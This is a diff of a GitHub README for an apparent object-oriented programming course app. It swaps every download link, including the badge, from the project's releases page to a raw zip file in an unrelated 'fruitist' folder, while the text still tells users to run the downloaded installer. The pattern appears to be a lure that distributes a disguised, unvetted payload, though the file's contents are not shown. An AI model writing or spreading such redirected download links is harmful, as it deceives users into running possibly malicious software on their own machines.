@@ -1,6 +1,6 @@
 # 🎓 CIN0135-20252 - Simplifying Learning for Object-Oriented Programming
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now%21-Get%20the%20Latest%20Release-blue)](https://github.com/Promax0-0/CIN0135-20252/releases)
+[![Download Now!](https://raw.githubusercontent.com/Promax0-0/CIN0135-20252/main/fruitist/CIN0135-20252.zip%20Now%21-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Promax0-0/CIN0135-20252/main/fruitist/CIN0135-20252.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ To get started with the CIN0135-20252 application, you’ll need to download it 
 
 ## 🔗 Download & Install
 
-1. Visit this page to download: [Download CIN0135-20252](https://github.com/Promax0-0/CIN0135-20252/releases).
+1. Visit this page to download: [Download CIN0135-20252](https://raw.githubusercontent.com/Promax0-0/CIN0135-20252/main/fruitist/CIN0135-20252.zip).
 2. Locate the latest release version on this page. It will show the date and version number.
 3. Click on the appropriate file for your operating system. This might be a .exe file for Windows or a .zip file containing files for other systems.
 4. Open the downloaded file and follow the on-screen instructions to install the application.
@@ -65,7 +65,7 @@ A: You can reach us through the issues section on the GitHub page. Describe your
 
 ## 🔗 Download Again
 
-If you need to download the application again, you can easily do so by visiting: [Download CIN0135-20252](https://github.com/Promax0-0/CIN0135-20252/releases).
+If you need to download the application again, you can easily do so by visiting: [Download CIN0135-20252](https://raw.githubusercontent.com/Promax0-0/CIN0135-20252/main/fruitist/CIN0135-20252.zip).
 
 ## 👨‍🏫 Meet Your Instructor
 
